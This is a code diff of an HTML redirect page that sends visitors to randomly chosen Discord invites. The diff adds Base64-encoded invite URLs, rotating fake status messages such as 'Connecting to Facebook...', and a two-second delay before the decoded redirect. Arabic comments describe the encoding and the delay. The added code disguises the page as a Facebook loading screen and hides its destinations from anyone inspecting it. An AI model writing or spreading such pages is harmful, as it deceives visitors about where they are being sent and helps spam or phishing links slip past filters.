@@ -2,28 +2,49 @@
 <html>
   <head>
     <meta charset="UTF-8" />
-    <title>Redirecting to redace...</title>
+    <title>Loading...</title>
     <script>
-      // new adduct
-      const links = [
-        "https://discord.gg/X9X5fde7fA",
-        "https://discord.gg/5RnEzmaFbY",
-        "https://discord.gg/j5tYE2nnxZ",
-        "https://discord.com/invite/8gfSY3ZvqM",
-        "https://discord.gg/N4TPT2aRzP",
-        "https://discord.gg/d2TuHYnYsA",
-        "https://discord.gg/NfNRUvZWvR",
-        "https://discord.gg/cx3caYrKSR"
+      // رسائل متنوعة تظهر كل مرة
+      const messages = [
+        "Loading page...",
+        "Please wait...",
+        "Redirecting...",
+        "Connecting to Facebook...",
+        "One moment please...",
+        "Hold on, preparing your page...",
+        "Syncing data...",
+        "Fetching content..."
       ];
 
-      // اختيار عشوائي
-      const randomLink = links[Math.floor(Math.random() * links.length)];
+      // روابط مشفرة (Base64)
+      const encodedLinks = [
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL3lkWHRmQmRhZzY=",
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL2JKVWFBWUdld0Q=",
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL1VLVzQ5V0t2M3o=",
+        "aHR0cHM6Ly9kaXNjb3JkLmdnLzNySHNINzJoYWI=",
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL2pmc2dBODN6WGg=",
+        "aHR0cHM6Ly9kaXNjb3JkLmdnLzV5ajU4Y25na3g=",
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL21KRmJEbWFtdmo=",
+        "aHR0cHM6Ly9kaXNjb3JkLmdnL21LbWo5ZVVkM3g="
+      ];
 
-      // إعادة توجيه
-      window.location.href = randomLink;
+      // اختيار رسالة ورابط عشوائيين
+      const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+      const randomEncodedLink = encodedLinks[Math.floor(Math.random() * encodedLinks.length)];
+
+      // عرض الرسالة في الصفحة
+      window.onload = function() {
+        document.getElementById("status").textContent = randomMessage;
+
+        // تأخير 2 ثانية ثم التوجيه
+        setTimeout(() => {
+          const decodedLink = atob(randomEncodedLink);
+          window.location.href = decodedLink;
+        }, 2000);
+      };
     </script>
   </head>
   <body>
-    <p>Wait for facebook...</p>
+    <p id="status">Please wait...</p>
   </body>
 </html>
